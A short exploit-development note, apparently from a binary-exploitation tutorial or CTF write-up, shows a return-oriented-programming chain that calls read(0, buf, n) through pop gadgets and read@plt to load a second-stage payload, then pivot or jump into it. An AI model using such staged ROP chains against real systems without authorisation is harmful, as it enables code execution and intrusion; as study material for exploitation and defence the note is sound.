# The read chain — the stage-2 pull


The complete read(0, buf, n):

    pop rdi ; 0
    pop rsi ; buf_addr
    pop rdx ; n
    read@plt

Then the buffer holds stage 2 — pivot or jump into it.
